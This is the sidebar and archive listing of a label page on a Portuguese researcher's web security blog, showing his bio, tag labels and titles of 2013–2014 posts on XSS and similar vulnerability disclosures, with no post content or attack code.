[panda](http://davidsopaslabs.blogspot.com/search/label/panda)

[Newer Posts](http://davidsopaslabs.blogspot.com/ "Newer Posts")

[Older Posts](http://davidsopaslabs.blogspot.com/search?updated-max=2013-01-10T11:16:00-08:00&max-results=7 "Older Posts")

[Home](http://davidsopaslabs.blogspot.com/)

Subscribe to:
[Posts (Atom)](http://davidsopaslabs.blogspot.com/feeds/posts/default)

## About me

My name is David Sopas. I'm a portuguese web security researcher.

I've been acknowledged by Google, Adobe, eBay, Microsoft, Yahoo, Panda Security, AVG, Kaspersky, McAfee, Hootsuite and Alexa.

Published security advisories for Prestashop, phpBB, osCommerce, e107, PHP-Nuke, Mambo and others.

Feel free to follow me on Twitter - [@dsopas](https://www.twitter.com/dsopas)

## Donations

Some companies returned the favor by offering me the following:

2x T-Shirts
1x Water bottle
2x Premium accounts
1x Flashlight
1x Antivirus license
$450 bucks

Keep in mind that some of my researches prevented companies of losing millions of dollars... I only expect a "Thank you".

## Labels

[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss)

[xss](http://davidsopaslabs.blogspot.com/search/label/xss)

[antivirus](http://davidsopaslabs.blogspot.com/search/label/antivirus)

[csrf](http://davidsopaslabs.blogspot.com/search/label/csrf)

[google](http://davidsopaslabs.blogspot.com/search/label/google)

[persistent xss](http://davidsopaslabs.blogspot.com/search/label/persistent%20xss)

[malware](http://davidsopaslabs.blogspot.com/search/label/malware)

[prestashop](http://davidsopaslabs.blogspot.com/search/label/prestashop)

[ebay](http://davidsopaslabs.blogspot.com/search/label/ebay)

[google vulnerability reward program](http://davidsopaslabs.blogspot.com/search/label/google%20vulnerability%20reward%20program)

[jwplayer](http://davidsopaslabs.blogspot.com/search/label/jwplayer)

[self-xss](http://davidsopaslabs.blogspot.com/search/label/self-xss)

[CVE-2013-4791](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-4791)

[CVE-2013-4792](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-4792)

[CVE-2013-6295](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-6295)

[CVE-2014-2916](http://davidsopaslabs.blogspot.com/search/label/CVE-2014-2916)

[ad\_iframe.html](http://davidsopaslabs.blogspot.com/search/label/ad_iframe.html)

[alexa](http://davidsopaslabs.blogspot.com/search/label/alexa)

[amazon](http://davidsopaslabs.blogspot.com/search/label/amazon)

[anythingslider](http://davidsopaslabs.blogspot.com/search/label/anythingslider)

[avg](http://davidsopaslabs.blogspot.com/search/label/avg)

[backdoors](http://davidsopaslabs.blogspot.com/search/label/backdoors)

[blogger](http://davidsopaslabs.blogspot.com/search/label/blogger)

[booking](http://davidsopaslabs.blogspot.com/search/label/booking)

[bounty](http://davidsopaslabs.blogspot.com/search/label/bounty)

[ccs](http://davidsopaslabs.blogspot.com/search/label/ccs)

[ckeditor](http://davidsopaslabs.blogspot.com/search/label/ckeditor)

[deadspin](http://davidsopaslabs.blogspot.com/search/label/deadspin)

[deface](http://davidsopaslabs.blogspot.com/search/label/deface)

[dod](http://davidsopaslabs.blogspot.com/search/label/dod)

[dow jones](http://davidsopaslabs.blogspot.com/search/label/dow%20jones)

[easter egg](http://davidsopaslabs.blogspot.com/search/label/easter%20egg)

[ensighten](http://davidsopaslabs.blogspot.com/search/label/ensighten)

[eset](http://davidsopaslabs.blogspot.com/search/label/eset)

[fbi](http://davidsopaslabs.blogspot.com/search/label/fbi)

[fckeditor](http://davidsopaslabs.blogspot.com/search/label/fckeditor)

[file upload](http://davidsopaslabs.blogspot.com/search/label/file%20upload)

[gawker](http://davidsopaslabs.blogspot.com/search/label/gawker)

[giftcards](http://davidsopaslabs.blogspot.com/search/label/giftcards)

[gizmodo](http://davidsopaslabs.blogspot.com/search/label/gizmodo)

[google analytics](http://davidsopaslabs.blogspot.com/search/label/google%20analytics)

[google bots](http://davidsopaslabs.blogspot.com/search/label/google%20bots)

[hacker](http://davidsopaslabs.blogspot.com/search/label/hacker)

[helpouts](http://davidsopaslabs.blogspot.com/search/label/helpouts)

[hootsuite](http://davidsopaslabs.blogspot.com/search/label/hootsuite)

[hp](http://davidsopaslabs.blogspot.com/search/label/hp)

[html5](http://davidsopaslabs.blogspot.com/search/label/html5)

[idg now](http://davidsopaslabs.blogspot.com/search/label/idg%20now)

[io9](http://davidsopaslabs.blogspot.com/search/label/io9)

[issuu](http://davidsopaslabs.blogspot.com/search/label/issuu)

[jalopnik](http://davidsopaslabs.blogspot.com/search/label/jalopnik)

[jezebel](http://davidsopaslabs.blogspot.com/search/label/jezebel)

[jobs.cz](http://davidsopaslabs.blogspot.com/search/label/jobs.cz)

[kaspersky](http://davidsopaslabs.blogspot.com/search/label/kaspersky)

[kernel](http://davidsopaslabs.blogspot.com/search/label/kernel)

[kotaku](http://davidsopaslabs.blogspot.com/search/label/kotaku)

[lifehacker](http://davidsopaslabs.blogspot.com/search/label/lifehacker)

[macosx](http://davidsopaslabs.blogspot.com/search/label/macosx)

[magento](http://davidsopaslabs.blogspot.com/search/label/magento)

[mashable](http://davidsopaslabs.blogspot.com/search/label/mashable)

[mcafee](http://davidsopaslabs.blogspot.com/search/label/mcafee)

[microsoft](http://davidsopaslabs.blogspot.com/search/label/microsoft)

[modules](http://davidsopaslabs.blogspot.com/search/label/modules)

[neal poole](http://davidsopaslabs.blogspot.com/search/label/neal%20poole)

[olx](http://davidsopaslabs.blogspot.com/search/label/olx)

[open redirect](http://davidsopaslabs.blogspot.com/search/label/open%20redirect)

[orkut](http://davidsopaslabs.blogspot.com/search/label/orkut)

[owasp-dv-004](http://davidsopaslabs.blogspot.com/search/label/owasp-dv-004)

[panda](http://davidsopaslabs.blogspot.com/search/label/panda)

[phishing](http://davidsopaslabs.blogspot.com/search/label/phishing)

[phpbb](http://davidsopaslabs.blogspot.com/search/label/phpbb)

[phplist](http://davidsopaslabs.blogspot.com/search/label/phplist)

[phpmyadmin](http://davidsopaslabs.blogspot.com/search/label/phpmyadmin)

[proxy](http://davidsopaslabs.blogspot.com/search/label/proxy)

[referrer](http://davidsopaslabs.blogspot.com/search/label/referrer)

[root](http://davidsopaslabs.blogspot.com/search/label/root)

[runkeeper](http://davidsopaslabs.blogspot.com/search/label/runkeeper)

[slow dos](http://davidsopaslabs.blogspot.com/search/label/slow%20dos)

[sql injection](http://davidsopaslabs.blogspot.com/search/label/sql%20injection)

[symantec](http://davidsopaslabs.blogspot.com/search/label/symantec)

[timing attacks](http://davidsopaslabs.blogspot.com/search/label/timing%20attacks)

[tinymce](http://davidsopaslabs.blogspot.com/search/label/tinymce)

[tor](http://davidsopaslabs.blogspot.com/search/label/tor)

[tshirt](http://davidsopaslabs.blogspot.com/search/label/tshirt)

[tumblr](http://davidsopaslabs.blogspot.com/search/label/tumblr)

[user-agent](http://davidsopaslabs.blogspot.com/search/label/user-agent)

[weekend reading](http://davidsopaslabs.blogspot.com/search/label/weekend%20reading)

[wordpress](http://davidsopaslabs.blogspot.com/search/label/wordpress)

[xss worm](http://davidsopaslabs.blogspot.com/search/label/xss%20worm)

[yahoo](http://davidsopaslabs.blogspot.com/search/label/yahoo)

## Blogroll

* [Egor Homakov](http://homakov.blogspot.com/)
* [Neal Poole](https://nealpoole.com/blog/)
* [Ben Hayak](http://www.benhayak.com/)
* [Nils Junemann](http://www.nilsjuenemann.de/)
* [Nir Goldshlager](http://www.nirgoldshlager.com/)

## Blog Archive

* ►
  [2014](http://davidsopaslabs.blogspot.com/2014/)
  (3)
  + ►
    [April](http://davidsopaslabs.blogspot.com/2014/04/)
    (1)
  + ►
    [March](http://davidsopaslabs.blogspot.com/2014/03/)
    (1)
  + ►
    [January](http://davidsopaslabs.blogspot.com/2014/01/)
    (1)

* ▼
  [2013](http://davidsopaslabs.blogspot.com/2013/)
  (27)
  + ▼
    [November](http://davidsopaslabs.blogspot.com/2013/11/)
    (3)
    - [3 Open Redirect on Google - UNFIXED](http://davidsopaslabs.blogspot.com/2013/11/3-open-redirect-on-google-unfixed.html)
    - [How it was possible to run a XSS worm on RunKeeper](http://davidsopaslabs.blogspot.com/2013/11/how-it-was-possible-to-run-xss-worm-on.html)
    - [Google Bots doing SQL Injection - The Proof-of-Con...](http://davidsopaslabs.blogspot.com/2013/11/google-bots-doing-sql-injection-proof.html)
  + ►
    [October](http://davidsopaslabs.blogspot.com/2013/10/)
    (2)
    - [How a salesman could hack Prestashop](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html)
    - [Wordpress, FBI and TOR, Kernel.org and DOM XSS](http://davidsopaslabs.blogspot.com/2013/10/wordpress-fbi-and-tor-kernelorg-and-dom.html)
  + ►
    [September](http://davidsopaslabs.blogspot.com/2013/09/)
    (4)
    - [Tumblr got DOM XSSed](http://davidsopaslabs.blogspot.com/2013/09/tumblr-got-dom-xssed.html)
    - [Your weekend reading about web security](http://davidsopaslabs.blogspot.com/2013/09/your-weekend-reading-about-web-security.html)
    - [Gizmodo, Lifehacker, Gawker - reflected DOM XSS](http://davidsopaslabs.blogspot.com/2013/09/gizmodo-lifehacker-gawker-reflected-dom.html)
    - [Mashable DOM XSS](http://davidsopaslabs.blogspot.com/2013/09/mashable-dom-xss.html)
  + ►
    [August](http://davidsopaslabs.blogspot.com/2013/08/)
    (2)
    - [ESET and Symantec victims of vulnerable JW Player](http://davidsopaslabs.blogspot.com/2013/08/eset-and-symantec-victims-of-vulnerable.html)
    - [Vulnerable JW Player on two Yahoo sites](http://davidsopaslabs.blogspot.com/2013/08/vulnerable-jw-player-on-two-yahoo-sites.html)
  + ►
    [July](http://davidsopaslabs.blogspot.com/2013/07/)
    (3)
    - [Dowjones.com DOM XSS](http://davidsopaslabs.blogspot.com/2013/07/dowjonescom-dom-xss.html)
    - [Prestashop persistent XSS and CSRF vulnerability](http://davidsopaslabs.blogspot.com/2013/07/prestashop-persistent-xss-and-csrf.html)
    - [Issuu DOM XSS](http://davidsopaslabs.blogspot.com/2013/07/issuu-dom-xss.html)
  + ►
    [June](http://davidsopaslabs.blogspot.com/2013/06/)
    (2)
    - [Microsoft Pinpoint vulnerable to DOM XSS](http://davidsopaslabs.blogspot.com/2013/06/microsoft-pinpoint-vulnerable-to-dom-xss.html)
    - [Jobs.cz XSS vulnerability](http://davidsopaslabs.blogspot.com/2013/06/jobscz-xss-vulnerability.html)
  + ►
    [April](http://davidsopaslabs.blogspot.com/2013/04/)
    (2)
    - [IDG Now! vulnerable to reflected XSS](http://davidsopaslabs.blogspot.com/2013/04/idg-now-vulnerable-to-reflected-xss.html)
    - [phpMyAdmin XSS](http://davidsopaslabs.blogspot.com/2013/04/phpmyadmin-xss_12.html)
  + ►
    [March](http://davidsopaslabs.blogspot.com/2013/03/)
    (2)
    - [XSS on FCKeditor](http://davidsopaslabs.blogspot.com/2013/03/xss-on-fckeditor.html)
    - [Alexa reflected DOM XSS](http://davidsopaslabs.blogspot.com/2013/03/alexa-reflected-dom-xss.html)
  + ►
    [February](http://davidsopaslabs.blogspot.com/2013/02/)
    (4)
    - [McAfee DOM XSS](http://davidsopaslabs.blogspot.com/2013/02/mcafee-dom-xss.html)
    - [DOM XSS vulnerabilities on Booking.com](http://davidsopaslabs.blogspot.com/2013/02/dom-xss-vulnerabilities-on-bookingcom.html)
    - [eBay XSS vulnerability](http://davidsopaslabs.blogspot.com/2013/02/ebay-xss-vulnerability.html)
    - [Disable Blogger.com toolbar](http://davidsopaslabs.blogspot.com/2013/02/disable-bloggercom-toolbar.html)
  + ►
    [January](http://davidsopaslabs.blogspot.com/2013/01/)
    (3)
    - [Kaspersky DOM XSS](http://davidsopaslabs.blogspot.com/2013/01/kaspersky-dom-xss.html)
    - [AVG vulnerable to DOM XSS](http://davidsopaslabs.blogspot.com/2013/01/avg-vulnerable-to-dom-xss.html)
    - [Panda Security vulnerable to DOM XSS](http://davidsopaslabs.blogspot.com/2013/01/panda-security-vulnerable-to-dom-xss.html)

* ►
  [2012](http://davidsopaslabs.blogspot.com/2012/)
  (3)
  + ►
    [December](http://davidsopaslabs.blogspot.com/2012/12/)
    (1)
  + ►
    [November](http://davidsopaslabs.blogspot.com/2012/11/)
    (1)
  + ►
    [October](http://davidsopaslabs.blogspot.com/2012/10/)
    (1)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).


